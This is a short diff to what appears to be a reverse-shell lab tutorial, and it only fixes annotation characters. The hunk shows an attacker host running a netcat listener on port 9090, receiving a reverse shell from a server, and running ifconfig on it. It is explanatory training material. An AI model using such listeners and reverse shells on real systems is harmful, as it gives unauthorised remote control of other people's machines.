@@ -267,10 +267,10 @@ following experiment, *netcat* (*nc* for short) is used to listen for a connecti
 only on the first line).
 
 ```
-Attacker(10.0.2.6):$ nc -nv -l 9090 Ÿ **Waiting for reverse shell**
+Attacker(10.0.2.6):$ nc -nv -l 9090 <- **Waiting for reverse shell**
 Listening on 0.0.0.0 9090
 Connection received on 10.0.2.5 39452
-Server(10.0.2.5):$ **Reverse shell from 10.0.2.5.**
+Server(10.0.2.5):$ <- **Reverse shell from 10.0.2.5.**
 Server(10.0.2.5):$ ifconfig
 ifconfig
 enp0s3: flags=4163<UP,BROADCAST,RUNNING,MULTICAST> mtu 1500
